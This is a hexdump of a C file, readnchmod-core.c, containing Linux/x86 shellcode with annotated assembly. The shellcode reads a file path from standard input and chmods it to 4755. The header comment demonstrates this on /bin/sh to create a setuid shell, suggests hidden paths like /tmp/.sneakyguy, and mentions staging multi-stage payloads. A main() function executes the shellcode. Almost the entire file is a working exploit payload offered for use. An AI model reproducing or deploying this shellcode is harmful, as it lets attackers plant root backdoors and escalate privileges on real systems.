00000000  2f 2a 20 72 65 61 64 6e  63 68 6d 6f 64 2d 63 6f  |/* readnchmod-co|
00000010  72 65 2e 63 20 62 79 20  43 68 61 72 6c 65 73 20  |re.c by Charles |
00000020  53 74 65 76 65 6e 73 6f  6e 20 3c 63 6f 72 65 40  |Stevenson <core@|
00000030  62 6f 6b 65 6f 61 2e 63  6f 6d 3e 20 0d 0a 20 2a  |bokeoa.com> .. *|
00000040  0d 0a 20 2a 20 45 78 61  6d 70 6c 65 20 6f 66 20  |.. * Example of |
00000050  73 74 72 61 63 65 20 6f  75 74 70 75 74 20 69 66  |strace output if|
00000060  20 79 6f 75 20 70 61 73  73 20 69 6e 20 22 2f 62  | you pass in "/b|
00000070  69 6e 2f 73 68 5c 78 30  30 22 0d 0a 20 2a 20 72  |in/sh\x00".. * r|
00000080  65 61 64 28 30 2c 20 22  2f 62 69 6e 2f 73 68 5c  |ead(0, "/bin/sh\|
00000090  30 22 2c 20 32 35 34 31  29 20 20 20 20 20 20 20  |0", 2541)       |
000000a0  20 20 20 20 20 20 20 3d  20 38 0d 0a 20 2a 20 63  |       = 8.. * c|
000000b0  68 6d 6f 64 28 22 2f 62  69 6e 2f 73 68 22 2c 20  |hmod("/bin/sh", |
000000c0  30 34 37 35 35 29 20 20  20 20 20 20 20 20 20 20  |04755)          |
000000d0  20 20 20 20 20 20 20 3d  20 30 0d 0a 20 2a 0d 0a  |       = 0.. *..|
000000e0  20 2a 20 41 6e 79 20 66  69 6c 65 20 70 61 74 68  | * Any file path|
000000f0  20 63 61 6e 20 62 65 20  67 69 76 65 6e 2e 20 20  | can be given.  |
00000100  46 6f 72 20 65 78 61 6d  70 6c 65 3a 20 2f 74 6d  |For example: /tm|
00000110  70 2f 2e 73 6e 65 61 6b  79 67 75 79 0d 0a 20 2a  |p/.sneakyguy.. *|
00000120  20 54 68 65 20 6f 6e 6c  79 20 63 61 76 65 61 74  | The only caveat|
00000130  20 69 73 20 74 68 61 74  20 74 68 65 20 73 74 72  | is that the str|
00000140  69 6e 67 20 6d 75 73 74  20 62 65 20 4e 55 4c 4c  |ing must be NULL|
00000150  20 74 65 72 6d 69 6e 61  74 65 64 2e 0d 0a 20 2a  | terminated... *|
00000160  20 54 68 69 73 20 73 68  6f 75 6c 64 6e 27 74 20  | This shouldn't |
00000170  62 65 20 61 20 70 72 6f  62 6c 65 6d 2e 20 20 46  |be a problem.  F|
00000180  6f 72 20 6d 75 6c 74 69  2d 73 74 61 67 65 20 70  |or multi-stage p|
00000190  61 79 6c 6f 61 64 73 20  73 65 6e 64 0d 0a 20 2a  |ayloads send.. *|
000001a0  20 69 6e 20 74 68 69 73  20 66 69 72 73 74 20 61  | in this first a|
000001b0  6e 64 20 74 68 65 6e 20  79 6f 75 20 63 61 6e 20  |nd then you can |
000001c0  73 65 6e 64 20 69 74 20  64 61 74 61 20 77 69 74  |send it data wit|
000001d0  68 20 6e 75 6c 6c 20 62  79 74 65 73 2e 0d 0a 20  |h null bytes... |
000001e0  2a 20 49 20 6d 61 64 65  20 74 68 69 73 20 66 6f  |* I made this fo|
000001f0  72 20 72 61 72 65 20 63  61 73 65 73 20 77 69 74  |r rare cases wit|
00000200  68 20 74 69 67 68 74 20  73 70 61 63 65 20 63 6f  |h tight space co|
00000210  6e 74 72 61 69 6e 74 73  20 61 6e 64 0d 0a 20 2a  |ntraints and.. *|
00000220  20 77 68 65 72 65 20 72  65 61 64 28 29 20 6a 6d  | where read() jm|
00000230  70 20 2a 25 65 73 70 20  69 73 20 6e 6f 74 20 70  |p *%esp is not p|
00000240  72 61 63 74 69 63 61 6c  2e 0d 0a 20 2a 0d 0a 20  |ractical... *.. |
00000250  2a 2f 0d 0a 63 68 61 72  20 68 65 6c 6c 63 6f 64  |*/..char hellcod|
00000260  65 5b 5d 20 3d 20 2f 2a  20 72 65 61 64 28 30 2c  |e[] = /* read(0,|
00000270  62 75 66 2c 32 35 34 31  29 3b 20 63 68 6d 6f 64  |buf,2541); chmod|
00000280  28 62 75 66 2c 34 37 35  35 29 3b 20 6c 69 6e 75  |(buf,4755); linu|
00000290  78 2f 78 38 36 20 62 79  20 63 6f 72 65 20 2a 2f  |x/x86 by core */|
000002a0  0d 0a 22 5c 78 33 31 5c  78 64 62 22 2f 2f 20 20  |.."\x31\xdb"//  |
000002b0  20 20 20 20 20 20 20 20  20 20 20 20 20 78 6f 72  |             xor|
000002c0  20 20 20 20 25 65 62 78  2c 25 65 62 78 0d 0a 22  |    %ebx,%ebx.."|
000002d0  5c 78 66 37 5c 78 65 33  22 2f 2f 20 20 20 20 20  |\xf7\xe3"//     |
000002e0  20 20 20 20 20 20 20 20  20 20 6d 75 6c 20 20 20  |          mul   |
000002f0  20 25 65 62 78 0d 0a 22  5c 78 35 33 22 2f 2f 20  | %ebx.."\x53"// |
00000300  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000310  20 20 70 75 73 68 20 20  20 25 65 62 78 0d 0a 22  |  push   %ebx.."|
00000320  5c 78 62 36 5c 78 30 39  22 2f 2f 20 20 20 20 20  |\xb6\x09"//     |
00000330  20 20 20 20 20 20 20 20  20 20 6d 6f 76 20 20 20  |          mov   |
00000340  20 24 30 78 39 2c 25 64  68 0d 0a 22 5c 78 62 32  | $0x9,%dh.."\xb2|
00000350  5c 78 65 64 22 2f 2f 20  20 20 20 20 20 20 20 20  |\xed"//         |
00000360  20 20 20 20 20 20 6d 6f  76 20 20 20 20 24 30 78  |      mov    $0x|
00000370  65 64 2c 25 64 6c 0d 0a  22 5c 78 38 39 5c 78 65  |ed,%dl.."\x89\xe|
00000380  31 22 2f 2f 20 20 20 20  20 20 20 20 20 20 20 20  |1"//            |
00000390  20 20 20 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |   mov    %esp,%|
000003a0  65 63 78 0d 0a 22 5c 78  62 30 5c 78 30 33 22 2f  |ecx.."\xb0\x03"/|
000003b0  2f 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |/               |
000003c0  6d 6f 76 20 20 20 20 24  30 78 33 2c 25 61 6c 0d  |mov    $0x3,%al.|
000003d0  0a 22 5c 78 63 64 5c 78  38 30 22 2f 2f 20 20 20  |."\xcd\x80"//   |
000003e0  20 20 20 20 20 20 20 20  20 20 20 20 69 6e 74 20  |            int |
000003f0  20 20 20 24 30 78 38 30  0d 0a 22 5c 78 38 39 5c  |   $0x80.."\x89\|
00000400  78 64 31 22 2f 2f 20 20  20 20 20 20 20 20 20 20  |xd1"//          |
00000410  20 20 20 20 20 6d 6f 76  20 20 20 20 25 65 64 78  |     mov    %edx|
00000420  2c 25 65 63 78 0d 0a 22  5c 78 38 39 5c 78 65 33  |,%ecx.."\x89\xe3|
00000430  22 2f 2f 20 20 20 20 20  20 20 20 20 20 20 20 20  |"//             |
00000440  20 20 6d 6f 76 20 20 20  20 25 65 73 70 2c 25 65  |  mov    %esp,%e|
00000450  62 78 0d 0a 22 5c 78 62  30 5c 78 30 66 22 2f 2f  |bx.."\xb0\x0f"//|
00000460  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
00000470  6f 76 20 20 20 20 24 30  78 66 2c 25 61 6c 0d 0a  |ov    $0xf,%al..|
00000480  22 5c 78 63 64 5c 78 38  30 22 2f 2f 20 20 20 20  |"\xcd\x80"//    |
00000490  20 20 20 20 20 20 20 20  20 20 20 69 6e 74 20 20  |           int  |
000004a0  20 20 24 30 78 38 30 0d  0a 3b 0d 0a 0d 0a 69 6e  |  $0x80..;....in|
000004b0  74 20 6d 61 69 6e 28 76  6f 69 64 29 0d 0a 7b 0d  |t main(void)..{.|
000004c0  0a 20 20 76 6f 69 64 20  28 2a 73 68 65 6c 6c 29  |.  void (*shell)|
000004d0  28 29 20 3d 20 28 76 6f  69 64 20 2a 29 26 68 65  |() = (void *)&he|
000004e0  6c 6c 63 6f 64 65 3b 0d  0a 20 20 70 72 69 6e 74  |llcode;..  print|
000004f0  66 28 22 25 64 20 62 79  74 65 20 72 65 61 64 28  |f("%d byte read(|
00000500  30 2c 62 75 66 2c 32 35  34 31 29 3b 20 63 68 6d  |0,buf,2541); chm|
00000510  6f 64 28 62 75 66 2c 34  37 35 35 29 3b 20 6c 69  |od(buf,4755); li|
00000520  6e 75 78 2f 78 38 36 20  62 79 20 63 6f 72 65 5c  |nux/x86 by core\|
00000530  6e 22 2c 0d 0a 20 20 20  20 20 20 20 20 20 73 74  |n",..         st|
00000540  72 6c 65 6e 28 68 65 6c  6c 63 6f 64 65 29 29 3b  |rlen(hellcode));|
00000550  0d 0a 20 20 73 68 65 6c  6c 28 29 3b 0d 0a 20 20  |..  shell();..  |
00000560  72 65 74 75 72 6e 20 30  3b 0d 0a 7d              |return 0;..}|
0000056c
